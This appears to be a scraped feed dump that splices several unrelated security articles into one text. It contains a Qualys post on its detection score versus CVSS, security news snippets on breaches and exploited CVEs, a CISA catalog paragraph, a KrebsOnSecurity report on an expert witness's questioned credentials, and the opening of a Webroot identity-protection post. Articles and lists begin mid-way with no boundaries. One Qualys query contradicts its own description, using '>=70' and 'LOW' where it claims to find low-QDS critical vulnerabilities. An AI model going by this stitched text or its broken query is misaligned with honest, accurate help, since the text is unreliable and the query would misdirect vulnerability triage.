&lt;h3 class="wp-block-heading"&gt;Compensating Controls&lt;/h3&gt;



&lt;p&gt;The QDS assigned to an asset represents the inherent risk of that vulnerability. With &lt;a href="https://www.qualys.com/apps/trurisk-mitigate/"&gt;TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; Mitigate&lt;/a&gt;, part of our &lt;a href="https://www.qualys.com/apps/trurisk-eliminate/"&gt;TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; Eliminate&lt;/a&gt; portfolio, customers can apply compensating controls to endpoints, reducing the QDS score to reflect residual risk. This is particularly valuable when a vendor has not yet released a patch for a new vulnerability, and a configuration change on the asset can reduce its exposure risk.&lt;/p&gt;



&lt;p&gt;When reviewing the TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; score for an asset, the individual vulnerability scores that contribute to that score are expressed as QDS values. We will explore this further in Step 3 of our &lt;em&gt;Five-Steps to TruRi&lt;/em&gt;sk blog series.&lt;/p&gt;



&lt;p&gt;For example, with CVE-2021-34527 (Print Nightmare), stopping the print service would prevent exploitation of the vulnerability. However, since the underlying code facilitating the vulnerability remains on the system, the risk is still assessed, but the QDS score for that asset will be reduced. When prioritizing vulnerabilities across your environment, those that remain unmitigated will receive higher scrutiny.&lt;/p&gt;



&lt;p&gt;Additionally, we offer a beta feature for PC Control mitigation. If a PC Control passes for certain vulnerabilities, we’ll reduce the QDS for affected assets. To learn more about activating this beta feature and to obtain release notes, please reach out to your TAM.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Using QDS Beyond Vulnerabilities&lt;/h3&gt;



&lt;p&gt;QDS score assessments are not limited to vulnerabilities found throughout the Qualys platform. Risk factors beyond vulnerabilities can generate their own QDS scores, which contribute to an asset&amp;#8217;s TruRisk score provided the subscription owner has adopted the Cybersecurity Asset Management (CSAM) and Policy Compliance modules.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Unauthorized Ports (CSAM) – Assigns a QDS score based on the risk posed by open ports..&lt;/li&gt;



&lt;li&gt;End of Support (CSAM) – Assigns a QDS score based on vulnerabilities associated with End of Life or End of Service status of operating systems or software.&lt;/li&gt;



&lt;li&gt;Missing Required Software (CSAM) – Applies a custom QDS score when defined software required for asset protection is missing.&lt;/li&gt;



&lt;li&gt;Unauthorized Software (CSAM) – Applies a QDS score when defined rules identify software on an asset that poses organizational risk.&lt;/li&gt;



&lt;li&gt;Misconfigurations (PC) &amp;#8211; Applies a QDS score to assets based on failed controls linked to misconfigurations.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="practical-evaluation-of-qds-vs-cvss"&gt;Practical Evaluation of QDS vs CVSS&lt;/h2&gt;



&lt;p&gt;Risk appetite refers to the level of risk an organization is willing to accept in pursuit of its objectives before requiring mitigation or action. In vulnerability prioritization, organizations may choose to accept the risk associated with certain vulnerabilities such as those with low CVSS or Qualys Severity scores while placing greater emphasis on remediating vulnerabilities with higher scores, even if no immediate threat is detected.&lt;/p&gt;



&lt;p&gt;However, a vulnerability with a low CVSS score can still have a high QDS score. This often happens because attackers tend to exploit overlooked vulnerabilities, leveraging them to evade detection. Organizations relying solely on CVSS or traditional vulnerability management policies and SLAs may miss these risks, leaving them exposed.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Low CVSS criticality, with high QDS&lt;/h3&gt;



&lt;p&gt;To identify vulnerabilities with a QDS of 90 or higher and Low CVSS criticality, use the following QQL query:&lt;/p&gt;



&lt;p class="has-vivid-cyan-blue-color has-text-color has-link-color wp-elements-037e28e8a039e442b7662e4c300cec27"&gt;&lt;em&gt;vulnerabilities.detectionScore&amp;gt;=90 and vulnerabilities.vulnerability.criticality:LOW&lt;/em&gt;&amp;nbsp; &lt;em&gt;&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;In the example result below, CVE-2023-20867 has a CVSS score of 3.9, yet it appears on the CISA KEV list, is linked to an active malware campaign, and is being exploited by multiple threat actors demonstrating why QDS provides critical insights beyond CVSS alone.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/qds_figure_3-1.png"&gt;&lt;img alt="" class="wp-image-37527" height="493" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/qds_figure_3-1-1070x493.png" width="1070" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;High to Critical CVSS, Low QDS&lt;/h3&gt;



&lt;p&gt;Conversely, some vulnerabilities may have a high CVSS score but a low QDS score if they lack active exploitation or associated threats.&lt;/p&gt;



&lt;p&gt;To identify vulnerabilities with a QDS of 70 or lower and Critical CVSS classification, use the following QQL query:&lt;/p&gt;



&lt;p class="has-vivid-cyan-blue-color has-text-color has-link-color wp-elements-2650596b82938cc9d32688242c1028b4"&gt;&lt;em&gt;vulnerabilities.detectionScore&amp;gt;=70 and vulnerabilities.vulnerability.criticality:LOW&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;For example, CVE-2021-43905 has a critical CVSS score of 9.6, yet its QDS remains low due to the absence of known exploits or malware activity so the likelihood of exploitation is low.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/qds_figure_4-1.png"&gt;&lt;img alt="" class="wp-image-37528" height="493" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/qds_figure_4-1-1070x493.png" width="1070" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Understanding the distinction between CVSS and QDS will enable you to fine-tune your organization’s vulnerability strategy. Rather than solely relying on static severity scores, prioritize efforts using real world risk factors will ensure remediation efforts are directed where they matter most.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="from-overload-to-actionable-insights"&gt;From Overload to Actionable Insights&lt;/h2&gt;



&lt;p&gt;Security teams often face an overwhelming number of vulnerabilities, many of which may never be exploited. The challenge isn’t just finding vulnerabilities but knowing which ones actually matter. TruRisk Step 2 provides the intelligence needed to move from raw data to actionable insights, ensuring that security efforts are focused on the threats that pose the greatest risk to the organization. By combining real-time threat intelligence with asset context and exploitability data, security teams can prioritize remediation with confidence.&lt;/p&gt;



&lt;p&gt;With tools like the Qualys Vulnerability Score (QVS) and Qualys Detection Score (QDS), teams can go beyond generic severity ratings and understand the real likelihood of exploitation. This shifts security from a reactive approach—where teams chase every possible risk—to a strategic model that balances efficiency with effectiveness. The result is a security program that not only reduces risk but also aligns with broader business objectives, ensuring that resources are used where they have the most impact.&lt;/p&gt;

&lt;li&gt;Britain&amp;#8217;s Royal Mail was allegedly &lt;a href="https://www.theregister.com/2025/04/03/royal_mail_data_spectos/"&gt;hit&lt;/a&gt; by a data breach that resulted in the exposure of 293 folders and 16,549 files containing personal data such as names, physical addresses, phone numbers, and package details. The breach occurred through Spectos, a compromised German logistics management supplier, with a reported 144GB of data offered for sale by the GHNA hacking group.&lt;/li&gt;
&lt;li&gt;American dental service provider Chord Specialty Dental Partners has &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/chord-specialty-dental-partners-data-breach-impacts-more-than-170-000-people"&gt;suffered&lt;/a&gt; a cyber-attack that resulted in unauthorized access to several employee email accounts between August 19 and September 25, 2024. The attackers accessed sensitive information, including names, birth dates, addresses, bank account data, driver’s license numbers, Social Security Numbers, health insurance information, and medical records.&lt;/li&gt;
&lt;li&gt;Giant car-rental company Europcar Mobility Group &lt;a href="https://www.bleepingcomputer.com/news/security/europcar-gitlab-breach-exposes-data-of-up-to-200-000-customers/"&gt;confirmed&lt;/a&gt; a cyber-attack that allegedly breached its GitLab repositories, leading to the theft of source code for its Android and iOS applications and SQL backups. Dark web forum user claimed to have exposed over 9,000 SQL files and 269 .ENV files containing personal data such as names and email addresses, affecting between 50k to 200K clients.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Two vulnerabilities (CVE-2024-20439 and CVE-2024-20440) in Cisco Smart Licensing Utility are currently being &lt;a href="https://cybersecuritynews.com/cisco-smart-licensing-utility-vulnerabilities/"&gt;exploited&lt;/a&gt; in the wild. CVE-2024-20439, an undocumented static administrative credential, enables unauthenticated attackers to gain full administrative privileges via the CSLU API, while CVE-2024-20440, caused by excessive debug log verbosity, exposes API credentials through crafted HTTP requests. Both flaws, rated 9.8, can lead to complete system compromise.&lt;/li&gt;

&lt;li&gt;Researchers &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability/"&gt;found&lt;/a&gt; active exploitation of CVE-2025-22457, a buffer overflow flaw in Ivanti Connect Secure VPN appliances version 22.7R2.5 and earlier, by the suspected China-nexus espionage actor UNC5221. Successful exploitation allows remote code execution, leading to the deployment of malware families TRAILBLAZE and BRUSHFIRE, as well as the previously reported SPAWN ecosystem.&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;Apple &lt;a href="https://thehackernews.com/2025/04/apple-backports-critical-fixes-for-3.html"&gt;patched&lt;/a&gt; three zero-day vulnerabilities (CVE-2025-24085, CVE-2025-24200 and CVE-2025-24201) affecting older iOS and macOS devices. CVE-2025-24085, a use-after-free bug in Core Media (CVSS 7.3), enables privilege escalation; CVE-2025-24200, an Accessibility authorization flaw (CVSS 4.6), disables USB Restricted Mode; and CVE-2025-24201, an out-of-bounds write in WebKit (CVSS 8.8), permits escape from the Web Content sandbox.&lt;/li&gt;

&lt;li&gt;Check Point Research &lt;a href="https://blog.checkpoint.com/research/the-weaponization-of-pdfs-68-of-cyberattacks-begin-in-your-inbox-with-22-of-these-hiding-in-pdfs/"&gt;found&lt;/a&gt; that PDFs, used in 22% of malicious email attachments, are increasingly weaponized to conceal malicious payloads. Threat actors exploit the PDF format’s complexity—leveraging obfuscation techniques such as benign redirect services, QR codes, and static analysis evasion—to embed hidden links and code, bypassing conventional detection mechanisms.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.wiz.io/blog/postgresql-cryptomining"&gt;warn&lt;/a&gt; of a fileless cryptominer campaign targeting misconfigured and publicly exposed PostgreSQL servers. The threat actor, dubbed Jinx-0126, exploits weak, guessable credentials to deploy XMRig-C3 cryptominers filelessly and assigns a unique mining worker to each victim.&lt;/li&gt;

&lt;li&gt;Researchers &lt;a href="https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/"&gt;report&lt;/a&gt; on a malicious zoom installer leading to a BlackSuit ransomware infection. The attackers used loaders and malware (d3f@ckloader, IDAT loader, SectopRAT, Cobalt Strike, Brute Ratel, QDoor) for lateral movement, exfiltrating data and deploying ransomware over nine days.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://socket.dev/blog/malicious-pypi-package-targets-woocommerce-stores-with-automated-carding-attacks?utm_medium=feed"&gt;uncovered&lt;/a&gt; a malicious Python package, named ‘disgrasya’, on PyPI that automates carding attacks targeting WooCommerce stores via CyberSource payment gateways. The package, introduced in version 7.36.9 and downloaded over 34,000 times, simulates legitimate checkout flows to test stolen credit cards and facilitate automated fraud.&lt;/li&gt;

&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

Legal experts say the inquiry could be grounds to reopen a number of adjudicated cases in which the expert&amp;#8217;s testimony may have been pivotal.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70889" style="width: 827px;"&gt;&lt;img alt="" class="size-full wp-image-70889" height="597" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/marklanterman-linkedin.png" width="817" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70889"&gt;One might conclude from reading Mr. Lanterman&amp;#8217;s LinkedIn profile that has a degree from Harvard University.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.linkedin.com/in/marklanterman" rel="noopener" target="_blank"&gt;Mark Lanterman&lt;/a&gt;&lt;/strong&gt; is a former investigator for the U.S. Secret Service Electronics Crimes Task Force who founded the Minneapolis consulting firm &lt;strong&gt;Computer Forensic Services&lt;/strong&gt; (CFS). The CFS website says Lanterman&amp;#8217;s 30-year career has seen him testify as an expert in more than 2,000 cases, with experience in cases involving sexual harassment and workplace claims, theft of intellectual property and trade secrets, white-collar crime, and class action lawsuits.&lt;/p&gt;
&lt;p&gt;Or at least it did until last month, when Lanterman&amp;#8217;s profile and work history were quietly removed from the CFS website. The removal came after &lt;strong&gt;Hennepin County Attorney&amp;#8217;s Office&lt;/strong&gt; &lt;a href="https://www.hennepinattorney.org/news/news/2025/March/lanterman-disclosure" rel="noopener" target="_blank"&gt;said&lt;/a&gt; it was notifying parties to ten pending cases that they were unable to verify Lanterman&amp;#8217;s educational and employment background. The county attorney also said the FBI is now investigating the allegations.&lt;/p&gt;
&lt;p&gt;Those allegations were raised by &lt;strong&gt;Sean Harrington&lt;/strong&gt;, an attorney and forensics examiner based in Prescott, Wisconsin. Harrington alleged that Lanterman lied under oath in court on multiple occasions when he testified that he has a Bachelor of Science and a Master&amp;#8217;s degree in computer science from the now-defunct &lt;strong&gt;Upsala College&lt;/strong&gt;, and that he completed his postgraduate work in cybersecurity at &lt;strong&gt;Harvard University&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Harrington&amp;#8217;s claims gained steam thanks to digging by the law firm &lt;strong&gt;Perkins Coie LLP&lt;/strong&gt;, which is defending a case wherein a client&amp;#8217;s laptop was forensically reviewed by Lanterman. On March 14, Perkins Coie attorneys &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/155-1.pdf" rel="noopener" target="_blank"&gt;asked the judge&lt;/a&gt; (PDF) to strike Lanterman&amp;#8217;s testimony because neither he nor they could substantiate claims about his educational background.&lt;/p&gt;
&lt;p&gt;Upsala College, located in East Orange, N.J., operated for 102 years until it closed in 1995 after a period of declining enrollment and financial difficulties. Perkins Coie told the court that they&amp;#8217;d visited &lt;strong&gt;Felician University&lt;/strong&gt;, which holds the transcripts for Upsala College during the years Lanterman claimed to have earned undergraduate and graduate degrees. The law firm said Felician &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/155-21.pdf" rel="noopener" target="_blank"&gt;had no record of transcripts for Lanterman&lt;/a&gt; (PDF), and that his name was absent from all of the Upsala College student yearbooks and commencement programs during that period.&lt;/p&gt;
&lt;p&gt;Reached for comment, Lanterman acknowledged he had no way to prove he attended Upsala College, and that his &amp;#8220;postgraduate work&amp;#8221; at Harvard was in fact an eight-week online cybersecurity class called &lt;strong&gt;HarvardX&lt;/strong&gt;, which cautions that its certificates should not be considered equivalent to a Harvard degree or a certificate earned through traditional, in-person programs at Harvard University.&lt;/p&gt;
&lt;p&gt;Lanterman has testified that his first job after college was serving as a police officer in Springfield Township, Pennsylvania, although the Perkins Coie attorneys noted that this role was omitted from his resume. The attorneys said when they tried to verify Lanterman&amp;#8217;s work history, &amp;#8220;the police department responded with a story that would be almost impossible to believe if it was not corroborated by Lanterman&amp;#8217;s own email communications.&amp;#8221;&lt;/p&gt;
&lt;p&gt;As recounted in the March 14 filing, Lanterman was deposed on Feb. 11, and the following day &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/155-21.pdf" rel="noopener" target="_blank"&gt;he emailed the Springfield Township Police Department&lt;/a&gt; to see if he could have a peek at his old personnel file. On Feb. 14, Lanterman visited the Springfield Township PD and asked to borrow his employment record. He told the officer he spoke with on the phone that he&amp;#8217;d recently been instructed to &amp;#8220;get his affairs in order&amp;#8221; after being diagnosed with a grave heart condition, and that he wanted his old file to show his family about his early career.&lt;/p&gt;
&lt;p&gt;According to Perkins Coie, Lanterman left the Springfield Township PD with his personnel file, and has not returned it as promised.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It is shocking that an expert from Minnesota would travel to suburban Philadelphia and abscond with his decades-old personnel file to obscure his background,&amp;#8221; the law firm wrote. &amp;#8220;That appears to be the worst and most egregious form of spoliation, and the deception alone is reason enough to exclude Lanterman and consider sanctions.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Harrington initially contacted KrebsOnSecurity about his concerns in late 2023, fuming after sitting through &lt;a href="https://www.dropbox.com/scl/fi/srxrxkwyf03inudrw9ymn/2023-Seminar-Recording-copy-copy-1.MP4?rlkey=th0yqylm5uvmq84skfg8qvfh3&amp;amp;e=1&amp;amp;dl=0" rel="noopener" target="_blank"&gt;a conference speech&lt;/a&gt; in which Lanterman shared documents from a ransomware victim and told attendees it was because they&amp;#8217;d refused to hire his company to perform a forensic investigation on a recent breach.&lt;/p&gt;
&lt;p&gt;&amp;#8220;He claims he was involved in the Martha Stewart investigation, the Bernie Madoff trial, Paul McCartney’s divorce, the Tom Petters investigation, the Denny Hecker investigation, and many others,&amp;#8221; Harrington said. &amp;#8220;He claims to have been invited to speak to the Supreme Court, claims to train the &amp;#8216;entire federal judiciary&amp;#8217; on cybersecurity annually, and is a faculty member of the United States Judicial Conference and the Judicial College — positions which he obtained, in part, on a house of fraudulent cards.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In an interview this week, Harrington said court documents reveal that at least two of Lanterman&amp;#8217;s previous clients complained CFS had held their data for ransom over billing disputes. In &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/2022-10-26_Declaration-ofKimberlyHanlon.pdf" rel="noopener" target="_blank"&gt;a declaration&lt;/a&gt; (PDF) dated August 2022, the co-founder of the law firm &lt;strong&gt;MoreLaw Minneapolis LLC&lt;/strong&gt; said she hired Lanterman in 2014 to examine several electronic devices after learning that one of their paralegals had a criminal fraud history.&lt;/p&gt;
&lt;p&gt;But the law firm said when it pushed back on a consulting bill that was far higher than expected, Lanterman told them CFS would &amp;#8220;escalate&amp;#8221; its collection efforts if they didn&amp;#8217;t pay, including &amp;#8220;a claim and lien against the data which will result in a public auction of your data.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;All of us were flabbergasted by Mr. Lanterman’s email,&amp;#8221; wrote MoreLaw co-founder &lt;strong&gt;Kimberly Hanlon&lt;/strong&gt;. &amp;#8220;I had never heard of any legitimate forensic company threatening to &amp;#8216;auction&amp;#8217; off an attorney’s data, particularly knowing that the data is comprised of confidential client data, much of which is sensitive in nature.&amp;#8221;&lt;span id="more-70780"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;In 2009, a Wisconsin-based manufacturing company that had hired Lanterman for computer forensics balked at paying an $86,000 invoice from CFS, calling it &amp;#8220;excessive and unsubstantiated.&amp;#8221; The company told a Hennepin County court that on April 15, 2009, CFS conducted an auction of its trade secret information in violation of their confidentiality agreement.&lt;/p&gt;
&lt;p&gt;&amp;#8220;CFS noticed and conducted a Public Sale of electronic information that was entrusted to them pursuant to the terms of the engagement agreement,&amp;#8221; the company wrote. &amp;#8220;CFS submitted the highest bid at the Public Sale in the amount of $10,000.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-70891" height="439" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/27-cv-12-22089-ExtrusionDiesIndustries.png" width="1039" /&gt;&lt;/p&gt;
&lt;p&gt;Lanterman briefly responded to a list of questions about his background (and recent heart diagnosis) on March 24, saying he would send detailed replies the following day. Those replies never materialized. Instead, Lanterman forwarded a recent memo he wrote to the court that attacked Harrington and said his accuser was only trying to take out a competitor. He has not responded to further requests for comment.&lt;/p&gt;
&lt;p&gt;&amp;#8220;When I attended Upsala, I was a commuter student who lived with my grandparents in Morristown, New Jersey approximately 30 minutes away from Upsala College,&amp;#8221; Lanterman &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/ACU-Plasmold-Lanterman-Repsonse-Letter.pdf" rel="noopener" target="_blank"&gt;explained to the judge&lt;/a&gt; (PDF) overseeing &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/2025-03-12_memo-toCourt-1.pdf" rel="noopener" target="_blank"&gt;a separate ongoing case&lt;/a&gt; (PDF) in which he has testified. &amp;#8220;With limited resources, I did not participate in campus social events, nor did I attend graduation ceremonies. In 2023, I confirmed with Felician University — which maintains Upsala College’s records — that they could not locate my transcripts or diploma, a situation that they indicated was possibly due to unresolved money-related issues.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Lanterman was ordered to appear in court on April 3 in the case defended by Perkins Coie, but he did not show up. Instead, he sent a message to the judge withdrawing from the case.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I am 60 years old,&amp;#8221; Lanterman &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/lanterman-retire.png" rel="noopener" target="_blank"&gt;told the judge&lt;/a&gt;. &amp;#8220;I created my business from nothing. I am done dealing with the likes of individuals like Sean Harrington. And quite frankly, I have been planning at turning over my business to my children for years. That time has arrived.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Lanterman&amp;#8217;s letter leaves the impression that it was his decision to retire. But according to &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/affidavit-seanlanterman.pdf" rel="noopener" target="_blank"&gt;an affidavit&lt;/a&gt; (PDF) filed in a Florida case on March 28, Mark Lanterman&amp;#8217;s son Sean said he&amp;#8217;d made the difficult decision to ask his dad to step down given all the negative media attention.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mark Rasch&lt;/strong&gt;, a former federal cybercrime prosecutor who now serves as counsel to the New York cybersecurity intelligence firm &lt;a href="https://www.unit221b.com" rel="noopener" target="_blank"&gt;Unit 221B&lt;/a&gt;, said that if an expert witness is discredited, any defendants who lost cases that were strongly influenced by that expert&amp;#8217;s conclusions at trial could have grounds for appeal.&lt;/p&gt;
&lt;p&gt;Rasch said law firms who propose an expert witness have a duty in good faith to vet that expert&amp;#8217;s qualifications, knowing that those credentials will be subject to cross-examination.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Federal rules of civil procedure and evidence both require experts to list every case they have testified in as an expert for the past few years,&amp;#8221; Rasch said. &amp;#8220;Part of that due diligence is pulling up the results of those cases and seeing what the nature of their testimony has been.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Perhaps the most well-publicized case involving significant forensic findings from Lanterman was the 2018 conviction of &lt;strong&gt;Stephen Allwine&lt;/strong&gt;, who was &lt;a href="https://www.fox9.com/news/convicted-dark-net-killer-claims-innocence-i-couldnt-have-done-it" rel="noopener" target="_blank"&gt;found guilty of killing his wife&lt;/a&gt; two years earlier after attempts at hiring a hitman on the dark net fell through. Allwine is serving a sentence of life in prison, and continues to maintain that he was framed, casting doubt on computer forensic evidence found on 64 electronic devices taken from his home.&lt;/p&gt;
&lt;p&gt;On March 24, Allwine &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/78.pdf" rel="noopener" target="_blank"&gt;petitioned a Minnesota court&lt;/a&gt; (PDF) to revisit his case, citing the accusations against Lanterman and his role as a key witness for the prosecution.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70780</guid><category>A Little Sunshine</category><category>The Coming Storm</category><category>Computer Forensic Services</category><category>fbi</category><category>Felician University</category><category>HarvardX</category><category>Kimberly Hanlon</category><category>Mark Lanterman</category><category>mark rasch</category><category>Perkins Coie LLP</category><category>Sean Harrington</category><category>Stephen Allwine</category><category>U.S. Secret Service</category><category>Unit 221B</category><category>Upsala College</category></item><item><title>Identity Management Day: Safeguarding your digital identity</title><link>https://www.webroot.com/blog/2025/04/04/identity-management-day-safeguarding-your-digital-identity/</link><description>&lt;p&gt;Imagine waking up one day to find that someone has stolen your identity, opened credit cards in your name, or even withdrawn money from your bank accounts.

It’s something that can easily happen if your personal data falls into the hands of cybercriminals. In our interconnected world, data breaches and identity theft are a constant threat, making it more important than ever to guard your sensitive personal information. That’s why &lt;strong&gt;April 8&lt;sup&gt;th&lt;/sup&gt; is&amp;nbsp;&lt;/strong&gt;&lt;a href="https://www.idsalliance.org/event/identity-management-day-2025" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Identity Management Day&lt;/strong&gt;&lt;/a&gt;, a reminder to take steps to protect your digital identity from online threats.&lt;/p&gt;



&lt;p&gt;So, what is your &lt;a href="https://www.finextra.com/blogposting/16651/what-we-mean-by-digital-identity" rel="noreferrer noopener" target="_blank"&gt;digital identity&lt;/a&gt;? It’s all the private data that’s gathered about you on the internet &amp;#8211; from details like your email address, physical address, and date of birth, to bank account information and even purchasing habits. The more information you share online, the more vulnerable you become to cyber threats. For example, when you let a company save your address and credit card information, it may make your next online purchase easier, but it also increases the risk to your data if that company gets hacked. During the third quarter of 2024, data breaches exposed more than &lt;a href="https://www.statista.com/statistics/1307426/number-of-data-breaches-worldwide/" rel="noreferrer noopener" target="_blank"&gt;422 million records&lt;/a&gt; worldwide.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Tips for protecting your data&lt;/h2&gt;



&lt;p&gt;Cyber thieves are getting smarter and smarter using methods like phishing and malware to gain access to a piece of your personal information.&amp;nbsp; Once they have that they can use it to gain access to your digital life, commit fraud impersonating you, or sell it to others.&amp;nbsp; That’s why staying diligent and protecting your online identity is critical.&amp;nbsp; The best ways to do that are:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Strong passwords&lt;/strong&gt;: The number one way to protect your personal information is the simplest one. Make your passwords long, complex, and unique. Never recycle them! That way if one of your passwords is leaked, hackers won’t be able to use it to access any of your other accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Password managers:&lt;/strong&gt; Of course, we all need many unique passwords and it’s tricky to keep track of them all, especially when they’re complicated and one-of-a-kind. That’s where a password manager comes in. All Webroot solutions such as &lt;a href="https://www.webroot.com/us/en/home/products/essentials?utm_source=google&amp;amp;utm_medium=cpc&amp;amp;utm_id=13945200&amp;amp;utm_term=webroot%20essentials*&amp;amp;gad_source=1&amp;amp;gclid=CjwKCAjwp8--BhBREiwAj7og1yo7pAJKRGRU9naGoZqYggycnGmDnFFBa7f_TLaBAKxVmtM1ah6PNhoC7NYQAvD_BwE"&gt;Webroot Essentials&lt;/a&gt; include a&amp;nbsp;password manager&amp;nbsp;to keep your online safety simple. You only need to remember one password and Webroot manages the rest – keeping all your logins, passwords, and payment details organized and protected.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Multi-factor authentication (MFA):&lt;/strong&gt; By adding an &lt;a href="https://www.businessinsider.com/guides/tech/two-factor-authentication" rel="noreferrer noopener" target="_blank"&gt;extra security step&lt;/a&gt;, like a code sent to your phone, multi-factor authentication (MFA) makes it much harder for cybercriminals to break into your accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Identity protection services:&lt;/strong&gt; Antivirus programs protect against a wide range of malicious software designed to steal your personal information. For unmatched security and support, &lt;a href="https://www.webroot.com/us/en/home/products/premium?srsltid=AfmBOopsKI8rdaIrbwhvlpIfvsyfmJDE5ADk4uVYVyYM2_kcDl-GYeoN"&gt;Webroot Premium&lt;/a&gt; and &lt;a href="https://www.webroot.com/us/en/home/products/total-protection?utm_source=google&amp;amp;utm_medium=cpc&amp;amp;utm_id=13945200&amp;amp;utm_term=webroot%20total%20protection*&amp;amp;gad_source=1&amp;amp;gclid=CjwKCAjwp8--BhBREiwAj7og1_V0-4WdET635vamk5ebhG7rMaluoe53mjpwO67xTXX6NToNOPs1xBoCUEcQAvD_BwE"&gt;Webroot Total Protection&lt;/a&gt; offer all-in-one protection and include real-time monitoring to safeguard you from identity theft, as well as bank and credit fraud.&lt;/li&gt;



